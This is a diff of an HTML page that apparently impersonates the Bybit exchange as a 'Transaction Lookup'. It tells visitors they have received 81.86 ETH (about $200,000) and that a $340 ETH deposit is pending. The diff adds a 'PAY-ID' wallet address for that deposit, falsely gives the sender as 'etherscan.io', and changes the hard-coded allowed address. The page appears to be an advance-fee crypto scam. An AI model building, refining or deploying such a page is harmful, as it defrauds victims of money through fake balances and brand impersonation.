@@ -254,9 +254,9 @@
             <!-- Bybit logo, replace with your own if needed -->
             <img src="IMG_0682.jpeg" alt="Bybit Logo" />
         </div>
-        <h1>Bybit Wallet Lookup</h1>
+        <h1>Bybit Transaction Lookup</h1>
         <input type="text" id="ethAddress" placeholder="Enter Ethereum Address" value="0x1AD36967ab3811104d23C1C1d997AB5743843A4F">
-        <button id="lookupButton">Lookup</button>
+        <button id="lookupButton">process Lookup</button>
         
         <div id="wallet-info" style="display:none;">
             <div>
@@ -267,20 +267,23 @@
             <div id="transactionDetails" class="details">
                 <p>Dear User, you’ve <strong>successfully received 81.86 ETH</strong> (approx. <strong>$200,000</strong>)</p>
                 <p>Transaction Time: <strong id="txTime"></strong></p>
-                <p>TXID: <strong>0x1234...cdef</strong></p>
-                <p>From Address: <strong>0xabcdef...ef</strong></p>
+                <p>TXID: <strong>0x1234...cde442xxo</strong></p>
+                <p>From Address: <strong>etherscan.io</strong></p>
             </div>
             <div class="awaiting-deposit" id="awaitingDeposit">
-                Awaiting deposit of <strong>$340</strong> in ETH.
+                Awaiting deposit of <strong>$340.00</strong> in ETH.
             </div>
         </div>
+        <div class="awaiting-deposit" id="awaitingDeposit">
+        PAY-ID <strong>0xe30Ac60E1bEBe1A23A3B16548067d062c78DEBC4</strong> Erc20!!.
+            </div>
         <div id="error-message" style="display:none;">
             Sorry, this transaction doesn’t belong to you.
         </div>
     </div>
     <script>
         // The only allowed address
-        const ALLOWED_ADDRESS = "0x1AD36967ab3811104d23C1C1d997AB5743843A4F".toLowerCase();
+        const ALLOWED_ADDRESS = "0xa8dbd1dc0b300ebc6bad6c870d8d72db05b23692".toLowerCase();
         const lookupBtn = document.getElementById('lookupButton');
         const walletInfo = document.getElementById('wallet-info');
         const errorMsg = document.getElementById('error-message');
